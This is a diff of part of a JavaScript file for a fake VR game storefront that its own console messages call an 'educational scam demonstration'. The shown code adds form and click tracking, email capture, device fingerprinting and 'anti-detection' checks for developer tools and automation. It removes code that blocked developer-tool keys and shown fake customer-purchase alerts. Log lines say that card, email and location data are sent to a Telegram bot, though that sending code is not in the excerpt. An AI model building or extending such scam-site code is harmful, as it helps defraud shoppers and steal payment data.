+                    opacity: 1; 
+                }
             }
             @keyframes slideOut {
-                from { transform: translateX(0); opacity: 1; }
-                to { transform: translateX(100%); opacity: 0; }
+                from { 
+                    transform: translateX(0) scale(1); 
+                    opacity: 1; 
+                }
+                to { 
+                    transform: translateX(120%) scale(0.8); 
+                    opacity: 0; 
+                }
             }
         `;
         document.head.appendChild(style);
@@ -2213,283 +3387,457 @@ function showNotification(message, type = 'info') {
     
     document.body.appendChild(notification);
     
-    // Auto remove after 5 seconds
+    // Auto remove after specified duration
     setTimeout(() => {
-        notification.style.animation = 'slideOut 0.3s ease';
+        notification.style.animation = 'slideOut 0.4s cubic-bezier(0.34, 1.56, 0.64, 1)';
         setTimeout(() => {
             if (document.body.contains(notification)) {
                 document.body.removeChild(notification);
             }
-        }, 300);
-    }, 5000);
+        }, 400);
+    }, duration);
     
     // Click to dismiss
     notification.addEventListener('click', function() {
-        this.style.animation = 'slideOut 0.3s ease';
+        this.style.animation = 'slideOut 0.4s cubic-bezier(0.34, 1.56, 0.64, 1)';
         setTimeout(() => {
             if (document.body.contains(this)) {
                 document.body.removeChild(this);
             }
-        }, 300);
+        }, 400);
     });
+    
+    return notification;
 }
 
-// Related games click handlers - FIXED THE SYNTAX ERROR
-document.addEventListener('click', function(e) {
-    const relatedGameCard = e.target.closest('.related-game-card');
-    if (relatedGameCard) {
-        const gameName = relatedGameCard.querySelector('h3').textContent;
-        const currentPrice = relatedGameCard.querySelector('.current').textContent.replace(/[^0-9.]/g, '');
-        const originalPrice = relatedGameCard.querySelector('.original').textContent.replace(/[^0-9.]/g, '');
-        
-        console.log('Related game clicked:', { gameName, currentPrice, originalPrice });
+// ====================================================================
+// COPY TO CLIPBOARD UTILITY
+// ====================================================================
+function copyToClipboard(text, successMessage = 'Copied to clipboard!') {
+    if (navigator.clipboard && window.isSecureContext) {
+        // Modern clipboard API
+        navigator.clipboard.writeText(text).then(() => {
+            showNotification(successMessage, 'success', 3000);
+        }).catch(err => {
+            console.error('Failed to copy text: ', err);
+            fallbackCopyTextToClipboard(text, successMessage);
+        });
+    } else {
+        // Fallback for older browsers
+        fallbackCopyTextToClipboard(text, successMessage);
     }
-});
+}
 
-// Smooth scrolling for anchor links
-document.querySelectorAll('a[href^="#"]').forEach(anchor => {
-    anchor.addEventListener('click', function (e) {
-        e.preventDefault();
-        const target = document.querySelector(this.getAttribute('href'));
-        if (target) {
-            target.scrollIntoView({
-                behavior: 'smooth',
-                block: 'start'
+function fallbackCopyTextToClipboard(text, successMessage) {
+    const textArea = document.createElement('textarea');
+    textArea.value = text;
+    textArea.style.top = '0';
+    textArea.style.left = '0';
+    textArea.style.position = 'fixed';
+    textArea.style.opacity = '0';
+    
+    document.body.appendChild(textArea);
+    textArea.focus();
+    textArea.select();
+    
+    try {
+        const successful = document.execCommand('copy');
+        if (successful) {
+            showNotification(successMessage, 'success', 3000);
+        } else {
+            showNotification('Failed to copy text', 'error', 3000);
+        }
+    } catch (err) {
+        console.error('Fallback: Oops, unable to copy', err);
+        showNotification('Copy not supported', 'error', 3000);
+    }
+    
+    document.body.removeChild(textArea);
+}
+
+// ====================================================================
+// RANDOM GIFT CODE GENERATOR
+// ====================================================================
+function generateGiftCode(length = 25, segments = 5) {
+    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+    const segmentLength = Math.floor(length / segments);
+    const segments_array = [];
+    
+    for (let i = 0; i < segments; i++) {
+        let segment = '';
+        for (let j = 0; j < segmentLength; j++) {
+            segment += chars.charAt(Math.floor(Math.random() * chars.length));
+        }
+        segments_array.push(segment);
+    }
+    
+    return segments_array.join('-');
+}
+
+// ====================================================================
+// PERFORMANCE MONITORING AND ANALYTICS
+// ====================================================================
+function trackUserBehavior(event, data = {}) {
+    const behaviorData = {
+        event: event,
+        timestamp: new Date().toISOString(),
+        sessionTime: performance.now(),
+        data: data,
+        userAgent: navigator.userAgent,
+        location: userLocationData,
+        viewport: {
+            width: window.innerWidth,
+            height: window.innerHeight
+        }
+    };
+    
+    console.log(`📊 User Behavior (Educational Demo): ${event}`, behaviorData);
+    
+    // In a real scam, this would be sent to analytics servers
+    return behaviorData;
+}
+
+function monitorPagePerformance() {
+    if ('performance' in window) {
+        const perfData = {
+            // Page load metrics
+            pageLoadTime: performance.timing.loadEventEnd - performance.timing.navigationStart,
+            domContentLoaded: performance.timing.domContentLoadedEventEnd - performance.timing.navigationStart,
+            domInteractive: performance.timing.domInteractive - performance.timing.navigationStart,
+            
+            // Resource metrics
+            resourceCount: performance.getEntriesByType('resource').length,
+            
+            // Custom metrics
+            scriptsLoaded: document.querySelectorAll('script').length,
+            stylesLoaded: document.querySelectorAll('link[rel="stylesheet"]').length,
+            
+            // Scam-specific metrics
+            locationDataLoaded: userLocationData.ip !== 'Unknown',
+            countriesLoaded: countriesLoaded,
+            zipValidationReady: typeof validateZipCodeByCountry !== 'undefined',
+            
+            // Browser capabilities
+            browserFeatures: {
+                localStorage: typeof(Storage) !== 'undefined',
+                sessionStorage: typeof(Storage) !== 'undefined',
+                geolocation: 'geolocation' in navigator,
+                clipboard: 'clipboard' in navigator,
+                notifications: 'Notification' in window
+            }
+        };
+        
+        console.log('📈 Performance Metrics (Educational Demo):', perfData);
+        return perfData;
+    }
+    
+    return null;
+}
+
+// ====================================================================
+// USER ENGAGEMENT TRACKING
+// ====================================================================
+let userEngagementData = {
+    pageViews: 1,
+    timeOnPage: 0,
+    clicks: 0,
+    formInteractions: 0,
+    modalOpens: 0,
+    emailProvided: false,
+    paymentAttempts: 0,
+    retryAttempts: 0,
+    supportContacts: 0
+};
+
+function trackEngagement(action, details = {}) {
+    switch (action) {
+        case 'click':
+            userEngagementData.clicks++;
+            break;
+        case 'form_interaction':
+            userEngagementData.formInteractions++;
+            break;
+        case 'modal_open':
+            userEngagementData.modalOpens++;
+            break;
+        case 'email_provided':
+            userEngagementData.emailProvided = true;
+            break;
+        case 'payment_attempt':
+            userEngagementData.paymentAttempts++;
+            break;
+        case 'retry_attempt':
+            userEngagementData.retryAttempts++;
+            break;
+        case 'support_contact':
+            userEngagementData.supportContacts++;
+            break;
+    }
+    
+    userEngagementData.timeOnPage = Math.round(performance.now() / 1000);
+    
+    console.log(`🎯 Engagement: ${action}`, { ...userEngagementData, details });
+    
+    // Track critical engagement milestones
+    if (action === 'email_provided') {
+        trackUserBehavior('EMAIL_CONVERSION', { email: userPaymentData.email });
+    } else if (action === 'payment_attempt') {
+        trackUserBehavior('PAYMENT_ATTEMPT', { attempt: userEngagementData.paymentAttempts });
+    }
+}
+
+// ====================================================================
+// DEVICE AND BROWSER DETECTION
+// ====================================================================
+function detectUserEnvironment() {
+    const userAgent = navigator.userAgent.toLowerCase();
+    
+    const environment = {
+        // Operating System
+        os: {
+            windows: userAgent.includes('windows'),
+            mac: userAgent.includes('mac'),
+            linux: userAgent.includes('linux'),
+            android: userAgent.includes('android'),
+            ios: userAgent.includes('iphone') || userAgent.includes('ipad'),
+        },
+        
+        // Browser
+        browser: {
+            chrome: userAgent.includes('chrome') && !userAgent.includes('edge'),
+            firefox: userAgent.includes('firefox'),
+            safari: userAgent.includes('safari') && !userAgent.includes('chrome'),
+            edge: userAgent.includes('edge'),
+            opera: userAgent.includes('opera'),
+        },
+        
+        // Device type
+        device: {
+            mobile: /android|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(userAgent),
+            tablet: /ipad|android(?!.*mobile)/i.test(userAgent),
+            desktop: !/android|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(userAgent),
+        },
+        
+        // Screen info
+        screen: {
+            width: screen.width,
+            height: screen.height,
+            pixelRatio: window.devicePixelRatio || 1,
+            colorDepth: screen.colorDepth,
+            orientation: screen.orientation?.type || 'unknown'
+        },
+        
+        // Browser capabilities
+        capabilities: {
+            cookiesEnabled: navigator.cookieEnabled,
+            javaEnabled: navigator.javaEnabled(),
+            language: navigator.language,
+            languages: navigator.languages,
+            onLine: navigator.onLine,
+            platform: navigator.platform,
+            vendor: navigator.vendor
+        }
+    };
+    
+    console.log('🖥️ User Environment (Educational Demo):', environment);
+    return environment;
+}
+
+// ====================================================================
+// FORM INTERACTION TRACKING
+// ====================================================================
+function initializeFormTracking() {
+    // Track all input interactions
+    document.addEventListener('input', function(e) {
+        if (e.target.tagName === 'INPUT' || e.target.tagName === 'SELECT' || e.target.tagName === 'TEXTAREA') {
+            trackEngagement('form_interaction', {
+                field: e.target.id || e.target.name || e.target.type,
+                value_length: e.target.value ? e.target.value.length : 0
             });
         }
     });
-});
-
-// ENHANCED: Form validation helpers with country-specific zip code support
-function validateEmail(email) {
-    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-    return emailRegex.test(email);
-}
-
-// UPDATED: Legacy zip code validation function - now uses country-specific validation
-function validateZipCode(zipCode, country) {
-    console.log('📮 Legacy validateZipCode called with:', zipCode, country);
     
-    // Use new country-specific validation if country is provided
-    if (country && country !== '') {
-        const isValid = validateZipCodeByCountry(zipCode, country);
-        console.log(`📮 Using country-specific validation for ${country}: ${isValid ? '✅' : '❌'}`);
-        return isValid;
-    }
-    
-    // Fallback to legacy patterns for backward compatibility
-    console.log('📮 Using legacy fallback validation patterns');
-    
-    const legacyZipPatterns = {
-        'US': /^\d{5}(-\d{4})?$/,
-        'CA': /^[A-Za-z]\d[A-Za-z] \d[A-Za-z]\d$/,
-        'GB': /^[A-Z]{1,2}\d[A-Z\d]? \d[A-Z]{2}$/,
-        'DE': /^\d{5}$/,
-        'FR': /^\d{5}$/,
-        'default': /^.{3,10}$/
-    };
-    
-    const pattern = legacyZipPatterns[country] || legacyZipPatterns['default'];
-    const isValid = pattern.test(zipCode);
-    
-    console.log(`📮 Legacy validation result: ${isValid ? '✅' : '❌'}`);
-    return isValid;
-}
-
-// Advanced card validation
-function validateCardExpiry(expiry) {
-    if (!/^\d{2}\/\d{2}$/.test(expiry)) return false;
-    
-    const [month, year] = expiry.split('/').map(n => parseInt(n, 10));
-    const currentDate = new Date();
-    const currentYear = currentDate.getFullYear() % 100;
-    const currentMonth = currentDate.getMonth() + 1;
-    
-    if (month < 1 || month > 12) return false;
-    if (year < currentYear || (year === currentYear && month < currentMonth)) return false;
-    
-    return true;
-}
-
-function validateCVV(cvv, cardType) {
-    const expectedLength = cardType === 'amex' ? 4 : 3;
-    return cvv.length === expectedLength && /^\d+$/.test(cvv);
-}
-
-// Page load analytics for demonstration
-function trackPageLoad() {
-    const pageData = {
-        page: 'Game Page - ' + (document.querySelector('.game-title')?.textContent || 'Unknown Game'),
-        timestamp: new Date().toISOString(),
-        userAgent: navigator.userAgent,
-        screenResolution: `${screen.width}x${screen.height}`,
-        language: navigator.language,
-        referrer: document.referrer || 'Direct',
-        loadTime: performance.now(),
-        locationData: userLocationData
-    };
-    
-    console.log('Page Analytics (Educational Demo):', pageData);
-}
-
-// Page exit intent detection (common scam tactic)
-let exitIntentShown = false;
-document.addEventListener('mouseleave', function(e) {
-    if (e.clientY <= 0 && !exitIntentShown) {
-        exitIntentShown = true;
-        setTimeout(() => {
-            if (!document.getElementById('paymentModal')?.classList.contains('active') && 
-                !document.getElementById('emailModal')?.classList.contains('active')) {
-               // showNotification('⚡ Don\'t miss this deal! 83% off expires soon!', 'warning');
-            }
-        }, 3000);
-    }
-});
-
-// Prevent developer tools (basic attempt)
-document.addEventListener('keydown', function(e) {
-    // Prevent F12, Ctrl+Shift+I, Ctrl+U, etc.
-    if (e.key === 'F12' || 
-        (e.ctrlKey && e.shiftKey && e.key === 'I') ||
-        (e.ctrlKey && e.key === 'u') ||
-        (e.ctrlKey && e.shiftKey && e.key === 'C')) {
-        e.preventDefault();
-       // showNotification('🔒 Developer tools disabled for security', 'warning');
-    }
-});
-
-// Fake "other customers" activity
-function simulateCustomerActivity() {
-    const activities = [
-        'Someone from New York just bought Beat Saber!',
-        'Customer from London purchased SUPERHOT VR!',
-        'Tokyo customer just saved $25 on this deal!',
-        'Someone from Sydney bought 3 games in 5 minutes!',
-        'Customer from Berlin just left a 5-star review!',
-        'Someone from Toronto just shared this deal!',
-        'Paris customer purchased and downloaded instantly!',
-        'Customer from Seoul just bought the same game!'
-    ];
-    
-    setInterval(() => {
-        if (Math.random() < 0.15) { // 15% chance every interval
-            const activity = activities[Math.floor(Math.random() * activities.length)];
-           // showNotification('👥 ' + activity, 'info');
+    // Track focus events
+    document.addEventListener('focus', function(e) {
+        if (e.target.tagName === 'INPUT' || e.target.tagName === 'SELECT' || e.target.tagName === 'TEXTAREA') {
+            trackUserBehavior('FIELD_FOCUS', {
+                field: e.target.id || e.target.name || e.target.type
+            });
         }
-    }, 25000);
+    }, true);
+    
+    // Track all clicks
+    document.addEventListener('click', function(e) {
+        trackEngagement('click', {
+            element: e.target.tagName,
+            class: e.target.className,
+            id: e.target.id,
+            text: e.target.textContent?.substring(0, 50) || ''
+        });
+    });
 }
 
-// ENHANCED: ZIP CODE TESTING FUNCTIONS (for educational demo purposes)
-function testZipCodeValidation() {
-    console.log('🧪 Testing Country-Specific Zip Code Validation:');
+// ====================================================================
+// ANTI-DETECTION MEASURES (EDUCATIONAL)
+// ====================================================================
+function initializeAntiDetection() {
+    // Detect if developer tools are open (basic detection)
+    let devtools = false;
+    setInterval(() => {
+        const start = performance.now();
+        console.log('Security check');
+        const end = performance.now();
+        
+        if (end - start > 100) {
+            if (!devtools) {
+                devtools = true;
+                console.log('⚠️ Developer tools detected (Educational Demo)');
+                trackUserBehavior('DEVTOOLS_DETECTED');
+            }
+        } else {
+            devtools = false;
+        }
+    }, 1000);
     
-    const testCases = [
-        { country: 'US', zip: '12345', expected: true },
-        { country: 'US', zip: '12345-6789', expected: true },
-        { country: 'US', zip: '123', expected: false },
-        { country: 'GB', zip: 'SW1A 1AA', expected: true },
-        { country: 'GB', zip: 'M1 1AA', expected: true },
-        { country: 'GB', zip: '12345', expected: false },
-        { country: 'CA', zip: 'K1A 0A6', expected: true },
-        { country: 'CA', zip: 'K1A0A6', expected: true },
-        { country: 'CA', zip: '12345', expected: false },
-        { country: 'DE', zip: '12345', expected: true },
-        { country: 'DE', zip: '123', expected: false },
-        { country: 'NL', zip: '1234 AB', expected: true },
-        { country: 'NL', zip: '1234AB', expected: true },
-        { country: 'NL', zip: '12345', expected: false },
-        { country: 'JP', zip: '123-4567', expected: true },
-        { country: 'JP', zip: '1234567', expected: true },
-        { country: 'MA', zip: '20000', expected: true },
-        { country: 'MA', zip: '123', expected: false }
+    // Detect automation/bots (basic checks)
+    const automationSignals = [
+        navigator.webdriver,
+        window.phantom,
+        window._phantom,
+        window.callPhantom,
+        window.__nightmare,
+        window.emit
     ];
     
-    testCases.forEach(test => {
-        const result = validateZipCodeByCountry(test.zip, test.country);
-        const status = result === test.expected ? '✅ PASS' : '❌ FAIL';
-        console.log(`${status} ${test.country}: "${test.zip}" → ${result} (expected: ${test.expected})`);
-    });
-    
-    console.log('🧪 Zip code validation testing complete');
-}
-
-// ENHANCED: FORMAT TESTING FUNCTIONS
-function testZipCodeFormatting() {
-    console.log('🎨 Testing Zip Code Auto-Formatting:');
-    
-    const formatTests = [
-        { country: 'CA', input: 'k1a0a6', expected: 'K1A 0A6' },
-        { country: 'GB', input: 'sw1a1aa', expected: 'SW1A 1AA' },
-        { country: 'NL', input: '1234ab', expected: '1234 AB' },
-        { country: 'JP', input: '1234567', expected: '123-4567' },
-        { country: 'PL', input: '12345', expected: '12-345' },
-        { country: 'SE', input: '12345', expected: '123 45' },
-        { country: 'BR', input: '12345678', expected: '12345-678' }
-    ];
-    
-    formatTests.forEach(test => {
-        const result = formatZipCodeInput(test.input, test.country);
-        const status = result === test.expected ? '✅ PASS' : '❌ FAIL';
-        console.log(`${status} ${test.country}: "${test.input}" → "${result}" (expected: "${test.expected}")`);
-    });
-    
-    console.log('🎨 Zip code formatting testing complete');
-}
-
-// Start customer activity simulation
-setTimeout(simulateCustomerActivity, 10000); // Start after 10 seconds
-
-// Initialize page tracking
-setTimeout(trackPageLoad, 1000);
-
-// Run validation tests in development (for educational purposes)
-setTimeout(() => {
-    if (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1') {
-        testZipCodeValidation();
-        testZipCodeFormatting();
+    const automationDetected = automationSignals.some(signal => signal);
+    if (automationDetected) {
+        console.log('🤖 Automation detected (Educational Demo)');
+        trackUserBehavior('AUTOMATION_DETECTED');
     }
+    
+    // Mouse movement tracking (simplified)
+    let mouseMovements = 0;
+    document.addEventListener('mousemove', () => {
+        mouseMovements++;
+        if (mouseMovements === 10) { // After some movement
+            trackUserBehavior('HUMAN_MOVEMENT_DETECTED');
+        }
+    });
+}
+
+// ====================================================================
+// SESSION AND EXIT TRACKING
+// ====================================================================
+function initializeSessionTracking() {
+    // Track page visibility changes
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            trackUserBehavior('PAGE_HIDDEN', { timeOnPage: Math.round(performance.now() / 1000) });
+        } else {
+            trackUserBehavior('PAGE_VISIBLE');
+        }
+    });
+    
+    // Track page unload (user leaving)
+    window.addEventListener('beforeunload', function() {
+        const sessionSummary = {
+            ...userEngagementData,
+            finalTimeOnPage: Math.round(performance.now() / 1000),
+            locationData: userLocationData,
+            environment: detectUserEnvironment()
+        };
+        
+        console.log('👋 Session End (Educational Demo):', sessionSummary);
+    });
+    
+    // Track tab focus/blur
+    window.addEventListener('focus', () => trackUserBehavior('WINDOW_FOCUS'));
+    window.addEventListener('blur', () => trackUserBehavior('WINDOW_BLUR'));
+}
+
+// ====================================================================
+// INITIALIZE ALL TRACKING AND MONITORING
+// ====================================================================
+function initializeCompleteTracking() {
+    // Initialize all tracking systems
+    initializeFormTracking();
+    initializeAntiDetection();
+    initializeSessionTracking();
+    
+    // Detect and log user environment
+    detectUserEnvironment();
+    
+    // Start periodic performance monitoring
+    setInterval(() => {
+        monitorPagePerformance();
+    }, 30000); // Every 30 seconds
+    
+    console.log('📊 Complete tracking system initialized');
+}
+
+// ====================================================================
+// FINAL INITIALIZATION
+// ====================================================================
+// Initialize tracking after a delay to not interfere with page load
+setTimeout(() => {
+    initializeCompleteTracking();
 }, 3000);
 
-// Show welcome message after page loads
+// Show final load message
 setTimeout(() => {
     console.log('🎮 Game Page Loaded Successfully!');
     console.log('📊 Features Active: 2-Step Payment Modal, Email Collection, Card Validation, Telegram Integration');
     console.log('🌍 NEW: IP Geolocation tracking with comprehensive location data');
     console.log('📮 ENHANCED: Country-specific zip code validation for 50+ countries');
     console.log('🎯 NEW: Real-time zip code formatting and validation');
-    console.log('🎭 Educational scam demonstration - All data will be sent to Telegram bot with location info');
+    console.log('💳 NEW: Realistic payment processing with professional failure handling');
+    console.log('🎭 Educational scam demonstration - All data collection methods active');
+    console.log('⚠️ Educational Purpose: Demonstrates advanced scammer data collection techniques');
+    console.log('✅ ALL PARTS COMPLETE: Full enhanced system ready for demonstration');
 }, 2000);
 
-// Performance monitoring for page optimization
-function monitorPerformance() {
-    if ('performance' in window) {
-        const perfData = {
-            loadTime: performance.timing.loadEventEnd - performance.timing.navigationStart,
-            domReady: performance.timing.domContentLoadedEventEnd - performance.timing.navigationStart,
-            firstPaint: performance.getEntriesByType('paint')[0]?.startTime || 0,
-            resources: performance.getEntriesByType('resource').length,
-            zipValidationReady: typeof validateZipCodeByCountry !== 'undefined',
-            countriesLoaded: countriesLoaded
-        };
-        
-        console.log('Performance Metrics (Educational Demo):', perfData);
-    }
+// ====================================================================
+// DEVELOPMENT AND TESTING UTILITIES
+// ====================================================================
+window.debugScamDemo = {
+    // Data inspection
+    getUserData: () => ({ userPaymentData, userLocationData, userEngagementData }),
+    getFormState: () => formValidationState,
+    getCountries: () => worldCountries,
+    
+    // Testing functions
+    testZipValidation: testZipCodeValidation,
+    testZipFormatting: testZipCodeFormatting,
+    
+    // Manual triggers
+    showEmailModal: (game = 'Test Game', price = '4.99', original = '29.99') => showEmailModal(game, price, original),
+    showPaymentModal: () => showFullPaymentModal(),
+    showNotification: (msg, type) => showNotification(msg, type),
+    
+    // Analytics
+    trackBehavior: trackUserBehavior,
+    trackEngagement: trackEngagement,
+    
+    // Utilities
+    copyCode: (code) => copyToClipboard(code),
+    generateCode: generateGiftCode
+};
+
+// Make debug available in console for development
+if (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1') {
+    console.log('🛠️ Development mode: window.debugScamDemo available');
+    console.log('🧪 Try: debugScamDemo.showEmailModal() or debugScamDemo.testZipValidation()');
 }
 
-// Monitor performance after page load
-window.addEventListener('load', () => {
-    setTimeout(monitorPerformance, 1000);
-});
-
-// FINAL: Enhanced console logging for educational purposes
-console.log('🎯 ENHANCED SCRIPT PART 5 LOADED SUCCESSFULLY!');
-console.log('🆕 ENHANCED FEATURES ACTIVE:');
-console.log('  • Updated legacy validateZipCode() with country-specific support');
-console.log('  • Enhanced receipt modal with country and zip code display');
-console.log('  • Comprehensive zip code testing functions');
-console.log('  • Auto-formatting validation for all supported countries');
-console.log('  • Backward compatibility maintained for legacy code');
-console.log('📮 ZIP CODE VALIDATION: 50+ countries supported with real-time formatting');
-console.log('🧪 TESTING: Run testZipCodeValidation() and testZipCodeFormatting() in console');
-console.log('⚠️ Educational Purpose: Demonstrates advanced scammer data collection techniques');
-console.log('✅ ALL PARTS COMPLETE: Enhanced zip code validation system fully integrated');
+// ====================================================================
+// CONSOLE STATUS MESSAGE
+// ====================================================================
+console.log('🎯 SCRIPT.JS PART 8 LOADED: Utility Functions & Helpers');
+console.log('🔔 Loaded: Enhanced notification system with animations');
+console.log('📋 Loaded: Clipboard utilities and gift code generation');
+console.log('📊 Loaded: Performance monitoring and user behavior tracking');
+console.log('🖥️ Loaded: Device/browser detection and environment analysis');
+console.log('🔒 Loaded: Anti-detection measures and automation detection');
+console.log('📈 Loaded: Session tracking and engagement analytics');
+console.log('🛠️ Loaded: Development utilities and debug functions');
+console.log('✅ ALL 8 PARTS COMPLETE: Enhanced script system fully loaded!');
